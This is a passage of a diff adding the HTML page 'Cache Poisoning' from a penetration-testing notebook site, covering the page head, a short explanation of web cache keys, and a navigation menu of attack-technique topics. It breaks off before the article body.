@@ -1,0 +1,3278 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Overview# Web cache is a way to save response from server, so when a user request the same resource, it can just serve the same response again without having to bother the server again. Web cache use certain parameters in the request to determine if it should serve the same response or fetching new one. These are called Cache Key
+Cache Keys can be parameters like these, including but not limited to:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://rusted-silver.github.io/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/cache-poisoning/">
+  <meta property="og:site_name" content="SpellBook">
+  <meta property="og:title" content="SpellBook">
+  <meta property="og:description" content="Overview# Web cache is a way to save response from server, so when a user request the same resource, it can just serve the same response again without having to bother the server again. Web cache use certain parameters in the request to determine if it should serve the same response or fetching new one. These are called Cache Key
+Cache Keys can be parameters like these, including but not limited to:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="03.-enumeration">
+
+
+  <meta itemprop="name" content="SpellBook">
+  <meta itemprop="description" content="Overview# Web cache is a way to save response from server, so when a user request the same resource, it can just serve the same response again without having to bother the server again. Web cache use certain parameters in the request to determine if it should serve the same response or fetching new one. These are called Cache Key
+Cache Keys can be parameters like these, including but not limited to:">
+  <meta itemprop="wordCount" content="954">
+
+<title>Cache Poisoning | SpellBook</title>
+<link rel="icon" href="/spellbook/favicon.png" >
+<link rel="manifest" href="/spellbook/manifest.json">
+<link rel="canonical" href="https://rusted-silver.github.io/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/cache-poisoning/">
+<link rel="stylesheet" href="/spellbook/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">
+
+
+  <script defer src="/spellbook/fuse.min.js"></script>
+  <script defer src="/spellbook/en.search.min.5ba98d1a9d6abff7b5da47d3a9a39a720a0e32df83c349f0e060f2b59a2c20ca.js" integrity="sha256-W6mNGp1qv/e12kfTqaOacgoOMt&#43;Dw0nw4GDytZosIMo=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-03.-enumeration">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/spellbook/"><span>SpellBook</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+<ul><li><a href="/spellbook/">&lt;- Back to main page</a></li></ul>
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="toggle"  />
+    <label for="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="flex">
+      <a role="button" class="">
+        01. Passive Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/bug-bounty-dorks/" class="">
+      Bug Bounty Dorks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/dns/" class="">
+      DNS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/public-s3-buckets/" class="">
+      Public S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/source-code/" class="">
+      Source Code</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/subdomain-enumeration/" class="">
+      Subdomain Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-620ac26c1d74d3712f5771bd92ea1cd1" class="toggle"  />
+    <label for="section-620ac26c1d74d3712f5771bd92ea1cd1" class="flex">
+      <a role="button" class="">
+        02. Active Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/port-scan/" class="">
+      Port Scan</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/web---assets-enumeration/" class="">
+      Web Assets Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1eb6d1276e5402b7759fe597792fed3e" class="toggle" checked />
+    <label for="section-1eb6d1276e5402b7759fe597792fed3e" class="flex">
+      <a role="button" class="">
+        03. Enumeration</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="toggle" checked />
+    <label for="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="flex">
+      <a role="button" class="">
+        80,443 Tcp HTTP</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6121218ae46d8375829819d014e3b5f5" class="toggle"  />
+    <label for="section-6121218ae46d8375829819d014e3b5f5" class="flex">
+      <a role="button" class="">
+        Common Vulnerability</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/basic-http-auth/" class="">
+      Basic HTTP Auth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/blind-sqli/" class="">
+      Blind SQL I</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/code-injection/" class="">
+      Code Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/csrf/" class="">
+      Csrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/file-upload/" class="">
+      File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/graphql/" class="">
+      Graph Ql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/idor/" class="">
+      ID Or</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/jwt/" class="">
+      JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/lfi/" class="">
+      Lfi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/oauth/" class="">
+      Oauth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/pdf-generation-injection/" class="">
+      Pdf Generation Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/saml/" class="">
+      Saml</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/sql-injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/ssrf/" class="">
+      Ssrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/template-injection-ssti/" class="">
+      Template Injection ( Ssti)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/websocket/" class="">
+      Websocket</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xss/" class="">
+      Xss</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xxe/" class="">
+      Xxe</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-063b6da821fbfa4b9fcb65163a5b31d8" class="toggle" checked />
+    <label for="section-063b6da821fbfa4b9fcb65163a5b31d8" class="flex">
+      <a role="button" class="">
+        Rare Vulnerabilities</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/cache-poisoning/" class="active">
+      Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/crlf-injection/" class="">
+      Crlf Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/hosts-header-attacks/" class="">
+      Hosts Header Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ldap-injection/" class="">
+      Ldap Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/mongodb-injection/" class="">
+      Mongodb Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/padding-oracles/" class="">
+      Padding Oracles</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/request-smuggling/" class="">
+      Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/session-puzzling/" class="">
+      Session Puzzling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ssi-injection/" class="">
+      Ssi Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/tls-ssl-attacks/" class="">
+      Tls ( Ssl) Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xpath-injection/" class="">
+      Xpath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xslt-injection/" class="">
+      Xslt Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2e09e512163cdc60fcb006584b888a87" class="toggle"  />
+    <label for="section-2e09e512163cdc60fcb006584b888a87" class="flex">
+      <a role="button" class="">
+        Webapps Specific</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/drupal/" class="">
+      Drupal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/gitlab/" class="">
+      Git Lab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/jenkins/" class="">
+      Jenkins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/joomla/" class="">
+      Joomla</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/nexus-repository-manager/" class="">
+      Nexus Repository Manager</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/prtg/" class="">
+      Prtg</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/splunk/" class="">
+      Splunk</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/tomcat/" class="">
+      Tomcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/wordpress/" class="">
+      Word Press</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5de4a0e2a064acde43bb919dbfcee93b" class="toggle"  />
+    <label for="section-5de4a0e2a064acde43bb919dbfcee93b" class="flex">
+      <a role="button" class="">
+        Whitebox</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="toggle"  />
+    <label for="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="flex">
+      <a role="button" class="">
+        Deserialization</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/asp.net/" class="">
+      Asp. Net</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/introduction/" class="">
+      Introduction</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/php/" class="">
+      Php</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/python/" class="">
+      Python</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/decompilation-tools/" class="">
+      Decompilation Tools</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/iis-installation/" class="">
+      Iis Installation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/prototype-pollution/" class="">
+      Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/type-juggling/" class="">
+      Type Juggling</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/http-common-sense/" class="">
+      HTTP Common Sense</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/https-exfiltration-server/" class="">
+      HTTP S Exfiltration Server</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/scripts/" class="">
+      Scripts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webshells/" class="">
+      Webshells</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/110995-tcp---pop3/" class="">
+      110,995 Tcp POP3</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1151-tcp---oracle-db/" class="">
+      1151 Tcp Oracle Db</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/143993-tcp---imap/" class="">
+      143,993 Tcp IMAP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1433-tcp---mssql/" class="">
+      1433 Tcp Mssql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1611621016110162-udp---snmp/" class="">
+      161,162,10161,10162 UDP SNMP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/2049-tcp---nfs/" class="">
+      2049 Tcp Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/21-tcp---ftp/" class="">
+      21 Tcp FTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/25465587-tcp---smtp/" class="">
+      25,465,587 Tcp SMTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/27017-tcp---mongodb/" class="">
+      27017 Tcp Mongodb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/3306-tcp---mysql/" class="">
+      3306 Tcp My SQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/4222-tcp---nats/" class="">
+      4222 Tcp NAT S</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/445-tcp---smb/" class="">
+      445 Tcp Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/623-udp---ipmi/" class="">
+      623 UDP IP Mi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/873-tcp---rsync/" class="">
+      873 Tcp Rsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/default-credentials/" class="">
+      Default Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/r-services/" class="">
+      R Services</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c69393f67cd7496c728f5b58e6ac1ee" class="toggle"  />
+    <label for="section-2c69393f67cd7496c728f5b58e6ac1ee" class="flex">
+      <a role="button" class="">
+        04. Initial Access</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/smb/" class="">
+      Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/timeroasting/" class="">
+      Timeroasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-90c5584e370531caff111fc923627531" class="toggle"  />
+    <label for="section-90c5584e370531caff111fc923627531" class="flex">
+      <a role="button" class="">
+        05. Defense Evasion</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/applocker/" class="">
+      Applocker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/defender/" class="">
+      Defender</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/firewall/" class="">
+      Firewall</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/restriced-shell/" class="">
+      Restriced Shell</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07e5596a0ace078f0cf9976d44537c29" class="toggle"  />
+    <label for="section-07e5596a0ace078f0cf9976d44537c29" class="flex">
+      <a role="button" class="">
+        06. Privilege Escalation</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-085f8e8a106aad5123071eb91320ad16" class="toggle"  />
+    <label for="section-085f8e8a106aad5123071eb91320ad16" class="flex">
+      <a role="button" class="">
+        Linux</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="toggle"  />
+    <label for="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="flex">
+      <a role="button" class="">
+        Cve</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/dirty-pipe/" class="">
+      Dirty Pipe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/logrotate/" class="">
+      Logrotate</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/netfilter/" class="">
+      Netfilter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/sudo-cve/" class="">
+      Sudo Cve</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ed5af43f9c413fcde5c865f6213099b9" class="toggle"  />
+    <label for="section-ed5af43f9c413fcde5c865f6213099b9" class="flex">
+      <a role="button" class="">
+        Privileged Groups</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/adm/" class="">
+      Adm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/docker/" class="">
+      Docker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/lxc/" class="">
+      Lxc</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/credential-search/" class="">
+      Credential Search</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/crontab/" class="">
+      Crontab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/kubernetes/" class="">
+      Kubernetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/nfs/" class="">
+      Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/path-injection/" class="">
+      Path Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/python-library-hijack/" class="">
+      Python Library Hijack</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/sudo/" class="">
+      Sudo</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="toggle"  />
+    <label for="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="flex">
+      <a role="button" class="">
+        Windows</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-30c877d7e6dbf04e89232795939c9472" class="toggle"  />
+    <label for="section-30c877d7e6dbf04e89232795939c9472" class="flex">
+      <a role="button" class="">
+        Special Privileges</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/" class="">
+      Always Install Elevated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/dnsadmins/" class="">
+      DNS Admins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/event-log-readers/" class="">
+      Event Log Readers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/print-operators/" class="">
+      Print Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sebackupprivilege/" class="">
